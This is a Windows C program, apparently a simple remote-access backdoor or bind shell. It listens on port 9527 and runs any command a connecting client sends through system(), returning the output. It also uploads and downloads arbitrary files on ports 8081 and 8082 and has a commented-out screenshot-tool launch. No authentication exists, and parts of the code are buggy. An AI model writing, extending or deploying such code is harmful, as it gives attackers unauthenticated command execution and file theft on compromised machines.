#pragma comment(lib,"ws2_32.lib")
#include<WinSock2.h>
#include<stdio.h>

DWORD WINAPI Sendf(LPVOID name)
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err; 
	wVersionRequested = MAKEWORD(1,1);

	err = WSAStartup(wVersionRequested,&wsaData);
	if(0!=err)
		return -1;
	if(LOBYTE(wsaData.wVersion)!=1 || HIBYTE(wsaData.wVersion)!=1)
	{
		WSACleanup();
		return -1;
	}
	
	SOCKET sockSrv = socket(AF_INET,SOCK_STREAM,0);
	SOCKADDR_IN addrSrv;

	addrSrv.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(8081);
	
	bind(sockSrv,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));
	listen(sockSrv,5);
	SOCKADDR_IN addrClient;
	int len = sizeof(SOCKADDR);

	SOCKET sockConn = accept(sockSrv,(SOCKADDR*)&addrClient,&len);

	FILE *p=NULL;
	p=fopen((char*)name,"rb");
	if(p==NULL)
	{
		printf("file is not exist!\n\n");
		return -1;
	}

	char temp[30];
	memset(temp,0,30);
	int n=0;
	while(1)
	{
		if(!feof(p))
		{
			int t=fread(temp,1,20,p);
			int t1=sendto(sockConn,temp,t,0,(SOCKADDR*)&addrSrv,len);
			memset(temp,0,30);
			n=n+t1;
			printf("%dKB  %d\r",n/1024,t1);
			if(t1!=20)
				break;
		}
		else
		{			
			break;	
		}
	}
	printf("over!!!!\n\n");
	fclose(p);
	closesocket(sockConn);
	return -1;
}

DWORD WINAPI Recvf(LPVOID name)
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err; 
	wVersionRequested = MAKEWORD(1,1);

	err = WSAStartup(wVersionRequested,&wsaData);
	if(0!=err)
		return -1;
	if(LOBYTE(wsaData.wVersion)!=1 || HIBYTE(wsaData.wVersion)!=1)
	{
		WSACleanup();
		return -1;
	}
	
	SOCKET sockSrv = socket(AF_INET,SOCK_STREAM,0);
	SOCKADDR_IN addrSrv;

	addrSrv.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(8082);
	
	bind(sockSrv,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));
	listen(sockSrv,5);
	SOCKADDR_IN addrClient;
	int len = sizeof(SOCKADDR);

	SOCKET sockConn = accept(sockSrv,(SOCKADDR*)&addrClient,&len);
	
	printf("connect successfully\n");
	FILE *p=NULL;
	p=fopen((char*)name,"wb");
	char temp[30];
	memset(temp,0,30);
	int n=0;
	while(1)
	{
		int c=recv(sockConn,temp,20,0);
		n+=c;
		fwrite(temp,1,c,p);
		printf("%d\r",n/1024);
		if(c!=20)
			break;
		memset(temp,0,30);
	}
	printf("over!!!!\n\n");
	fclose(p);
	closesocket(sockConn);
	return -1;
}


void main()
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	wVersionRequested = MAKEWORD(1,1);

	err = WSAStartup(wVersionRequested,&wsaData);
	if(0!=err)
		return;
	if(LOBYTE(wsaData.wVersion)!=1 || HIBYTE(wsaData.wVersion)!=1)
	{
		WSACleanup();
		return;
	}
	
	SOCKET sockSrv = socket(AF_INET,SOCK_STREAM,0);
	SOCKADDR_IN addrSrv;

	addrSrv.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(9527);
	
	bind(sockSrv,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));
	listen(sockSrv,5);
	SOCKADDR_IN addrClient;
	int len = sizeof(SOCKADDR);

	SOCKET sockConn = accept(sockSrv,(SOCKADDR*)&addrClient,&len);

	printf("successfully connected!\n");

	while(1)
	{
		char recvBuf[100]={0};
		int c=recv(sockConn,recvBuf,100,0);
		if((recvBuf[0]=='q')&&(recvBuf[1]=='u')&&(recvBuf[2]=='i')&&(recvBuf[3]=='t'))
		{
			printf("%s\n","Chat end!");
			break;
		}
		recvBuf[c-1]='\0';
		printf("%s\n",recvBuf);

		if(c==-1)
			break;

		if(strcmp(recvBuf,"cd1")==0)
		{
			char cmd[1000]={0};
			int c=recv(sockConn,cmd,1000,0);
			cmd[c-1]='\0';
			SetCurrentDirectory(cmd);
		}
		else if(strcmp(recvBuf,"cls")==0||strcmp(recvBuf,"Cls")==0)
		{

		}
		else if(strcmp(recvBuf,"show")==0||strcmp(recvBuf,"Show")==0||strcmp(recvBuf,"S")==0)
		{
		//	ShellExecute(NULL,"open","E:\\java\\test\\jietu.exe",NULL,NULL,SW_SHOWNORMAL);
		}
		else if(strcmp(recvBuf,"down")==0||strcmp(recvBuf,"Down")==0)
		{
			break;
		}
		else if(strcmp(recvBuf,"recvfile")==0||strcmp(recvBuf,"Recvfile")==0)
		{
			char name[1000]={0};
			int c=recv(sockConn,name,1000,0);
			name[c-1]='\0';
			printf("%s\n",name);
			HANDLE hThread = CreateThread(NULL, 0, Sendf, name, 0, NULL);
			CloseHandle(hThread);
		}
		else if(strcmp(recvBuf,"sendfile")==0||strcmp(recvBuf,"Sendfile")==0)
		{
			char name[1000]={0};
			int c=recv(sockConn,name,1000,0);
			name[c-1]='\0';
			printf("%s\n",name);
			HANDLE hThread1 = CreateThread(NULL, 0, Recvf, name, 0, NULL);
			CloseHandle(hThread1);
		}
		else{ 
			strcat(recvBuf,"  >test.txt");
			system(recvBuf);
			FILE *p=fopen("test.txt","rb");
			while(!feof(p))
			{
				char str[1000]={0};
				int count=fread(str,1,999,p);
				int c=sendto(sockConn,str,count,0,(SOCKADDR*)&addrSrv,len);
				if(c==-1)
					break;
			}
			fclose(p); 
		}
		remove("test.txt");
		
	}
	closesocket(sockConn);
	return ;
}